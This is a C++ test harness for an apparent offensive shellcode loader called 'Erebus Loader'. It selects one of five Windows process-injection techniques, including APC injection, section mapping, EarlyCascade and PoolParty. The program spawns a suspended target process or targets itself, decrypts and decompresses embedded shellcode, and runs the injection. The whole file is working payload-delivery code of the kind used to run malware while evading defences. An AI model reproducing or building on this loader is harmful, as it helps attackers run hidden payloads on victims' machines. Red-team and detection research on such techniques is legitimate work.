/**
 * @file test_injection.cpp
 * @brief Test specific injection methods
 * 
 * Build with different CONFIG_INJECTION_TYPE values:
 *   make test-injection BUILD=debug INJECTION_TYPE=1  # NtQueueApcThread
 *   make test-injection BUILD=debug INJECTION_TYPE=2  # NtMapViewOfSection
 *   make test-injection BUILD=debug INJECTION_TYPE=3  # CreateFiber
 *   make test-injection BUILD=debug INJECTION_TYPE=4  # EarlyCascade
 *   make test-injection BUILD=debug INJECTION_TYPE=5  # PoolParty
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <windows.h>

// Force debug mode for logging
#ifndef _DEBUG
#define _DEBUG 1
#endif

#include "../include/loader.hpp"
#include "../include/shellcode.hpp"

// ============================================
// COLOR HELPERS
// ============================================

#define PRINT_HEADER(msg) \
    printf(COLOUR_BOLD COLOUR_CYAN "\n========================================\n"); \
    printf("%s\n", msg); \
    printf("========================================" COLOUR_DEFAULT "\n")

#define PRINT_SUCCESS(msg) \
    printf(COLOUR_BOLD COLOUR_GREEN "[+] %s" COLOUR_DEFAULT "\n", msg)

#define PRINT_ERROR(msg) \
    printf(COLOUR_BOLD COLOUR_RED "[!] %s" COLOUR_DEFAULT "\n", msg)

#define PRINT_INFO(msg) \
    printf(COLOUR_BOLD COLOUR_BLUE "[*] %s" COLOUR_DEFAULT "\n", msg)

// ============================================
// INJECTION METHOD NAME HELPER
// ============================================

const char* GetInjectionMethodName() {
#if CONFIG_INJECTION_TYPE == 1
    return "NtQueueApcThread (APC Injection)";
#elif CONFIG_INJECTION_TYPE == 2
    return "NtMapViewOfSection (Section Mapping)";
#elif CONFIG_INJECTION_TYPE == 3
    return "CreateFiber (Fiber-based Self-Injection)";
#elif CONFIG_INJECTION_TYPE == 4
    return "EarlyCascade (Early Bird APC)";
#elif CONFIG_INJECTION_TYPE == 5
    return "PoolParty (Worker Factory Thread Pool)";
#else
    return "Unknown";
#endif
}

// ============================================
// MAIN TEST
// ============================================

int main(int argc, char* argv[]) {
    PRINT_HEADER("EREBUS LOADER - INJECTION METHOD TEST");
    
    printf("Testing injection method: %s\n", GetInjectionMethodName());
    printf("CONFIG_INJECTION_TYPE: %d\n", CONFIG_INJECTION_TYPE);
    printf("CONFIG_INJECTION_MODE: %d (%s)\n", CONFIG_INJECTION_MODE, 
           CONFIG_INJECTION_MODE == 1 ? "Remote" : "Self");
    printf("\n");
    
    // Get the injection method
    erebus::config.injection_method = erebus::GetInjectionMethod();
    
    if (erebus::config.injection_method == nullptr) {
        PRINT_ERROR("Failed to get injection method - check CONFIG_INJECTION_TYPE");
        return 1;
    }
    
    PRINT_SUCCESS("Injection method loaded successfully");
    
    HANDLE process_handle = NULL;
    HANDLE thread_handle = NULL;
    SIZE_T shellcode_size = sizeof(shellcode);
    
    // Validate shellcode
    if (shellcode_size == 0 || (sizeof(shellcode) > 0 && shellcode[0] == 0x00)) {
        PRINT_ERROR("Shellcode is NULL or size is 0");
        return 1;
    }
    
    printf("Shellcode size: %zu bytes\n", shellcode_size);
    
    // Print first 16 bytes of shellcode
    printf("Shellcode preview: ");
    for (SIZE_T i = 0; i < min(16, shellcode_size); i++) {
        printf("%02X ", shellcode[i]);
    }
    printf("...\n\n");
    
#if CONFIG_INJECTION_MODE == 1
    // Remote injection: create suspended process
    wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
    printf("Target process: %ls\n", cmdline);
    
    PRINT_INFO("Creating suspended process...");
    
    if (!erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle)) {
        PRINT_ERROR("Failed to create suspended process");
        return 1;
    }
    
    DWORD pid = GetProcessId(process_handle);
    printf("Process created successfully (PID: %lu)\n", pid);
    PRINT_SUCCESS("Suspended process created");
    
#elif CONFIG_INJECTION_MODE == 2
    // Self injection: use current process
    process_handle = NtCurrentProcess();
    thread_handle = NtCurrentThread();
    PRINT_INFO("Using self-injection (current process)");
#endif
    
    if (!process_handle || !thread_handle) {
        PRINT_ERROR("Invalid process or thread handle");
        return 1;
    }
    
    // Allocate writable memory for shellcode
    PRINT_INFO("Allocating shellcode buffer...");
    BYTE* shellcode_ptr = (BYTE*)malloc(shellcode_size);
    if (!shellcode_ptr) {
        PRINT_ERROR("Failed to allocate shellcode buffer");
        return 1;
    }
    RtlCopyMemory(shellcode_ptr, shellcode, shellcode_size);
    
    // Process shellcode (decrypt/decompress)
    PRINT_INFO("Processing shellcode (decrypt/decompress)...");
    erebus::DecryptShellcode(&shellcode_ptr, &shellcode_size);
    erebus::DecompressShellcode(&shellcode_ptr, &shellcode_size);
    
    if (shellcode_ptr == NULL || shellcode_size == 0) {
        PRINT_ERROR("Shellcode processing failed");
        if (shellcode_ptr) free(shellcode_ptr);
        return 1;
    }
    
    printf("Processed shellcode size: %zu bytes\n", shellcode_size);
    
    // Execute injection
    PRINT_INFO("Executing injection method...");
    erebus::config.injection_method(shellcode_ptr, shellcode_size, process_handle, thread_handle);
    
    PRINT_SUCCESS("Injection method executed");
    
    // Cleanup
    if (shellcode_ptr)
        free(shellcode_ptr);
    
#if CONFIG_INJECTION_MODE == 1
    // For remote injection, we might want to resume or terminate the process
    printf("\nPress Enter to terminate the target process...");
    getchar();
    
    TerminateProcess(process_handle, 0);
    CloseHandle(process_handle);
    CloseHandle(thread_handle);
    PRINT_INFO("Target process terminated");
#endif
    
    PRINT_HEADER("TEST COMPLETE");
    
    return 0;
}
